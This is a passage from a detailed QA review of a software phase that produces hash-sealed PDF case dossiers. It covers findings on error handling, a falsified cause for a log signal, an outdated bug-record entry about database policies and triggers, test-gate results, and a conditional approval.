destructures `data` only and **never inspects `error`** on any of its eight reads, coalescing
with `?? []` — so a transient failure yields an answer-less phase rather than an exception, and
`buildResponseSections` still returns non-null. The RLS half of that is closed by Axis C; the
transient-error half means a **hash-sealed dossier can silently omit content**. Note the
contrast the same module already models: `getCaseDetailUncached` explicitly throws on `error`
for its side reads.

**N-3 — `assertRealPdf` cannot detect a truncated PDF.** `LOW / evidence.` § 2.5. Magic bytes
plus `> 1000` bytes; sibling specs have no length floor. Add a `%%EOF` trailer check.

**N-4 — the `504373718` signal has a wrong attribution on record and no right one.** `LOW / record.`
§ 2.5. Four documents call it a server-death signature; one calls it benign noise; none connects
it to the PDF routes or the abandoned-body pattern. ~~Attribute it, and drain the bodies.~~

> ⛔ **N-4's PROPOSED ATTRIBUTION IS FALSIFIED — measured 2026-08-25 by acting on it.** The bodies
> were drained at all three named sites and the signal **did not stop**; the drained run carried the
> **highest** count of the three (5, vs 4 and 3 undrained on the same build), so the count is not
> monotone in abandoned bodies. Two cases settle it: **corridor 1 consumes its PDF body and has no
> abandoned response at all — and emits the signal**, while **the prévia corridor consumes both
> variants' bodies and never emits it.** The test holding the four bodies still emitted exactly one
> after all four were drained.
> ⇒ **The cause is UNKNOWN and looks timing-dependent, not site-dependent.** ⛔ Do not write the
> abandoned-body explanation back into the record: that would be the **fifth** wrong attribution and
> the first one measured false. What this review established about the *mechanism* stands unchanged
> and is what matters — both routes fully materialize the buffer with all audit work awaited before
> the bytes, so the failure direction is **over**-audit and a truncated PHI document discloses less,
> not more. The durable home for that is the helper's docblock in the spec, where a gate-collapse
> investigator actually lands.
> ⚠ A **fourth** abandoned body this review did not list (`:1478-1479`, the 404 byte-path probe in
> the door-refused corridor — also the test that emitted the signal twice) was deliberately left
> undrained so the file matches the run that was measured.
> ⭐ The generalisable half: **N-4 asked for an attribution and got one that was wrong.** The fix was
> cheap enough to *run*, and running it is what turned a plausible cause into a measured non-cause.
> A recommendation to "attribute X" is a hypothesis, not a finding.

**N-5 — ⭐ `BUG-CASEEVT-KIND-001`'s entry in PROGRESS.md now contains a false fact, and P3 both
raised the bug's stakes and handed it a detection signal.** `MEDIUM / record accuracy.`

- **The policy premise is still true** — I re-measured: none of `case_events_writer_update`,
  `…_staff_admin_update`, `…_writer_delete`, `…_staff_admin_delete` carries `kind` in `USING`;
  only the two UPDATEs carry it in `WITH CHECK`. The bug is live.
- **The stated evidence is now false.** The entry says *"`pg_trigger` shows **zero** non-internal
  triggers on `case_events`"*. I measure **one**: `bump_case_print_revision`, AFTER ROW on
  **INSERT, DELETE and UPDATE**, `tgenabled = 'O'`, handler `app.trg_bump_case_revision()` —
  added by **this phase** (D15). A future fix-session reading that line will conclude no trigger
  and no second lock exist.
- **The stakes rose.** P3 seals `case_events` content into a hash-verified artifact with a public
  verification URL. A silent re-kind or unaudited delete before a mint yields an *authentically
  signed* dossier that misrepresents a procedural decision.
- **And P3 incidentally added tamper-evidence.** Because the trigger fires on UPDATE and DELETE
  and bumps `case_print_revisions`, such a write now (a) makes every already-minted dossier for
  that case read **NOT CURRENT** on `/verificar`, and (b) reds an in-flight mint with `HC0DU`.
  ⛔ **This is detection, not prevention, and not an audit row** — it only exists for cases that
  have a print, and only after the fact. The entry's *"the only control today is the UI
  suppression"* is now incomplete in both directions. Recommend correcting the entry and
  re-ranking the bug; **do not** let the revision bump be read as a mitigation.

---

## 2.8 What I could NOT verify — bounds with their mechanisms. **There is no pass 3.**

1. **Gate 2 (E2E) is RED (UNRUN) and I did not run it** (instructed not to; it is the lead's).
   *Mechanism:* the Windows monolith collapse, pre-existing and on record. **What that leaves
   unproven:** every claim whose only evidence is E2E — specifically D9's presence half and
   Amendment 2 pt 1, whose two assertions Amendment 6 states are *"the only pins that half will
   ever have."* I verified their **shape** is sound (delta-by-row-id, channel-controlled,
   exact-1 — § 2.6) but **not that they currently pass.** My approval is explicitly conditional
   on the PO's acceptance of this, recorded in § 2.9.
2. **Disposal has no E2E, and the bound is sharper than "irreversible against the seed."**
   `purgeLeftoverState` finds spec fixtures by `label LIKE 'Caso PDFCASE-SPEC%'`, which disposal
   redacts — so disposing a spec-owned case strands its children. *Covered by:* pgTAP `368` t45/t46,
   the `CASE_DISPOSED` fingerprint, the provider keystone t2, and — new this pass — my own
   constructed-and-rolled-back disposal through the real door (§ 2.2).
3. **Gotenberg egress in the Coolify deployment** is verified only from the deployment document,
   not from the running production topology. *Mechanism:* no access. The dev recipe I read
   directly; production inherits "inbound only". Direction is conservative — I assume egress is
   open, which is the worse case.
4. **The three TypeScript keystone mutations have no landing check.** *Mechanism:* they were
   hand-applied and are recorded only in the test file's own docstring. *Why I accept it:* their
   outcomes are **discriminating** (each mutation reds a different subset), which a non-landed
   edit cannot produce. Unlike the SQL harness, which enforces landing in code and which I re-ran.
5. **`pdf-payload.test.ts` cannot fail for a defect inside `@/lib/queries/cases`** — mocked
   wholesale. Stated by the file itself; provider-logic evidence only.
6. **The observed RED sets of the eight `368` mutations are not committed** — I reproduced them
   this pass (§ 2.4), so they are on record *here*, but a future reader must re-run or read this
   section.

---

## 2.9 Gate 1, re-measured independently — and the verdict

### Gate 1, my own run (not the lead's figures)

| check | result |
| --- | --- |
| `npm run lint` (all ten gates) | **exit 0** |
| `npm run typecheck` | **exit 0** |
| `npm run test` (vitest) | **exit 0** — **`Test Files 131 passed (131)` · `Tests 1812 passed (1812)`** |
| `supabase db reset --local` | exit 0 |
| `npm run test:db` (pgTAP, on that fresh reset) | **exit 0** — `Files=219, Tests=7332`, `All tests successful.`, **`Result: PASS`** |
| `p3-case-print-mutation-audit.sh` | **exit 0**, 8/8 fingerprints reproduced, 0 landing failures, baseline green before **and** after |
| 27-gate catalog reconciliation | reproduced independently (§ 2.3 item 1) |
| PUBLIC-executable ratchet | **237**, parts summing 228 + 9 |

⭐ **The denominator warning was worth heeding and I checked it: `131` of `131`, not `129` of
`131`.** The two DB-reading files (`nav-scope-exclusivity`, `session-grants`, 35 tests) ran and
passed, so my rolled-back probes left no residue.

⛔ **Two vacuous zeros my own harness produced, disclosed rather than reported.** My pgTAP
tally piped `grep -cE "^ok |^not ok "` over `prove`'s summary output, which contains no
per-assertion TAP lines — so `assertion_lines=0` and `NOT_OK=0` are **artifacts of my grep, not
measurements**, and I am not citing them. The load-bearing evidence is `Files=219, Tests=7332`,
`Result: PASS`, and exit 0 unpiped.

**Authz arms.** I did not re-run `ARM=census` / `hat` / `floor` / `FROMFINDINGS=1 ARM=wrapper` —
those are gate step 1 and the lead measured them on this tree. What I did instead is the thing a
policy-shaped audit is blind to and that no arm asks: I put **`prosecdef` beside `pg_policies`**
for all 27 gates myself, checked the ACLs in both forms (explicit and the NULL-is-PUBLIC
default), and verified the ratchet. The one arm-adjacent judgement I will record: **`ARM=census`
is the right arm for this phase** — 15 of the 27 gates are brand new, and a brand-new gate passes
`ARM=policy` vacuously.

### Verdict

# ✅ APPROVED

**Why.** All three of pass 1's blocking findings are closed, and each was closed at the layer
that could have falsified it rather than at the layer that reported it:

- **C-1** — the constitutive rule is in the code as a single term, its inputs cannot be
  coalesced, its premise is confirmed from `pg_get_functiondef`, its keystones are genuine
  two-directional differentials, and the "no standard-tier case document" invariant is
  **constructed-positive** at the catalog: `contains_phi = false ⟺ caseDisposed ⟺ HC0DP`. The
  Art. 18 hole is shut.
- **C-2** — the print schema is derived, single-consumer, and cannot loosen the shared policy;
  the layer-vacuity that the cosmetic placeholder introduced was caught and mitigated three ways;
  and § 7 item 7 now says the exposure was **live**, which retroactively justifies the severity
  pass 1 gave it.
- **C-3** — four cells present, and I did not take that on the record's word: I ran the harness,
  and mutations **5** and **6** move **disjoint** sets, so both floor personas are independently
  pinned on mint *and* download. The cell Amendment 6 found vacuous now moves four verdicts.
- **M-1 / M-2 / M-3** — settled (§ 2.3 items 8, § 2.4). **H-1** — closed by the committed tree.
- **§ 7 item 6**, the one item that could still have produced a new finding, resolves **clean and
  in the safe direction**, with two independent bounds and both controls moving.

The five new findings are hardening, evidence-strength and record-accuracy follow-ups. None is
an unmet **Acceptance** bullet, none is an RLS or immutability hole, and none would change what
ships.

⛔ **This approval is explicitly conditional on the PO ruling that accepts gate 2 at RED
(UNRUN).** I am approving **gate step 3**, not gate step 2. What that leaves unverified is named
in § 2.8 item 1 and is not empty: the two E2E assertions that are the *only* pins D9's presence
half and Amendment 2 point 1 will ever have are shape-verified by me but **not observed
passing**. If the PO wants that closed, the action is a full-suite run, not another QA pass.

⭐ **The one thing I would carry out of this phase**, beyond the code: a **parity** audit is not
a door audit. `ARM=hat` asks whether a door reads `memberships` without the caller's hat; it does
not ask whether two predicates *agree*, and a parity matrix that supplies the hat to one side and
a superuser to the other is biased toward "the door is wider" — which is indistinguishable from a
real over-grant. My first item-6 matrix said 11 cells over-granted. The number was zero.

**Recommended PROGRESS.md § QA Verdicts row** (I was instructed not to edit `PROGRESS.md`, so
this is for the lead to paste):

```
| **PDF·P3 — Printing Cases (ADR 0144)** | ✅ **APPROVED** (pass 2) — C-1/C-2/C-3 + M-1/M-2/M-3 + H-1 all closed; § 7 item 6 settled clean over 975 cells with both controls moving; gate 1 re-measured independently (lint/typecheck 0 · vitest 131/131 files, 1812 tests · pgTAP 219/7332 PASS on a fresh reset · mutation harness 8/8 fingerprints, 0 landing failures). ⛔ **Conditional on the PO ruling accepting gate 2 at RED (UNRUN)** — the two E2E-only pins for D9's presence half + Amdt 2 pt 1 are shape-verified, not observed passing. 5 non-blocking follow-ups (N-1…N-5), incl. a false fact in BUG-CASEEVT-KIND-001's entry | 2026-08-25 | [review](docs/reviews/phase-p3-review.md) |
```
